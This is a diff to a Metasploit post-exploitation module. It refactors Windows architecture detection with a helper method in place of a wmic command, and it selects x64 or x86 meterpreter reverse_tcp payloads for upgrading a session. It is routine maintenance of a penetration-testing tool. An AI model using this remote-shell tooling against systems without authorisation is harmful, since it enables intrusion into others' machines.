@@ -6,6 +6,7 @@ require 'rex/exploitation/cmdstager'
 
 class MetasploitModule < Msf::Post
   include Exploit::Powershell
+  include Post::Architecture
   include Post::Windows::Powershell
 
   def initialize(info = {})
@@ -84,19 +85,19 @@ class MetasploitModule < Msf::Post
     when 'windows', 'win'
       platform = 'windows'
       lplat = [Msf::Platform::Windows]
-      arch = cmd_exec('wmic os get osarchitecture')
-      if arch =~ /64-bit/m
+      arch = get_os_architecture
+      case arch
+      when ARCH_X64
         payload_name = 'windows/x64/meterpreter/reverse_tcp'
-        larch = [ARCH_X64]
         psh_arch = 'x64'
-      elsif arch =~ /32-bit/m
+      when ARCH_X86
         payload_name = 'windows/meterpreter/reverse_tcp'
-        larch = [ARCH_X86]
         psh_arch = 'x86'
       else
         print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
         return nil
       end
+      larch = [arch]
       vprint_status('Platform: Windows')
     when 'osx'
       platform = 'osx'
